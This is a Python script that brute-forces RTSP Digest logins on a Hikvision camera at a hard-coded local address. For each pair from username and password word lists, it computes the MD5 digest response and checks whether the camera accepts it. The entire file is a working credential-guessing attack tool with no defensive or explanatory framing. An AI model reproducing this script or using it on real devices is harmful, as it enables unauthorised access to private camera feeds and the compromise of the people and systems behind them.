import base64
import socket
import sys
from optparse import OptionParser
import os.path
import threading
import time
import select
import hashlib
import re

PORT = 554
IP = "192.168.1.5"
THREADS = 50
THREADBLOCKSIZE = 100
SLEEPTIME = 5
URI = "rtsp://192.168.1.5:554/Streaming/Channels/101"
METHOD = "OPTIONS"

username_f = open("username.txt", "r")
password_f = open("password.txt", "r")

# Creates packet to be sent via RTSP
COREPACKET_BASE = 'OPTIONS rtsp://%s/Streaming/Channels/101 RTSP/1.0\r\n' % IP
COREPACKET_BASE += 'CSeq: 3\r\n'
COREPACKET_TEST = COREPACKET_BASE + '\r\n'

for line in username_f:
    USERS = line.strip('\r').strip('\n')
    for line2 in password_f:
        PASSWORDS = line2.strip('\r').strip('\n')
        print(USERS + " " + PASSWORDS)

        # Creates a connection to the HikVision Device's RTSP port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((IP, PORT))
        s.sendall(COREPACKET_TEST.encode())

        # Checks the reply from the HikVIsion Device. Decodes the reply and converts to str
        data = str(s.recv(1024).decode())

        # From the response, obtain the REALM and NONCE data strings. This will be used to calculate the response later on
        x = re.findall('realm="[a-zA-Z0-9]*"', data)
        REALM = x[0].strip("realm").strip("=").strip('"')

        x = re.findall('nonce="[a-zA-Z0-9]*"', data)
        NONCE = x[0].strip("nonce").strip("=").strip('"')

        print("RTSP Response: \n" + data)

        # Calculate response using MD5 hash https://stackoverflow.com/questions/55379440/rtsp-video-streaming-with-authentication
        hashbrown1 = USERS + ":" + REALM + ":" + PASSWORDS
        hashbrown2 = METHOD + ":" + URI

        HA1 = hashlib.md5(hashbrown1.encode())
        HA2 = hashlib.md5(hashbrown2.encode())
        hashbrown3 = str(HA1.hexdigest()) + ":" + NONCE + ":" + str(HA2.hexdigest())
        response = hashlib.md5(hashbrown3.encode())
        RESPONSE = str(response.hexdigest())
        print("Response String Calculated: " + RESPONSE)

        # Send a packet to Authenticate the user
        COREPACKET_AUTH = COREPACKET_BASE + f'Authorization: Digest username="{USERS}", realm="{REALM}", nonce="{NONCE}", uri="{URI}", response="{RESPONSE}"\r\n'
        COREPACKET_AUTH += "User-Agent: LibVLC/3.0.20 (LIVE555 Streaming Media v2016.11.28)\r\n"
        COREPACKET_AUTH += "\r\n"
        s.sendall(COREPACKET_AUTH.encode())

        # If the correct password and username was used, it will return 200 OK. Else, it will return 401 Unauthorized
        data = str(s.recv(1024).decode())
        print("RTSP Response: \n" + data)


    password_f.close()
    password_f = open("password.txt", "r")
    time.sleep(0.5)
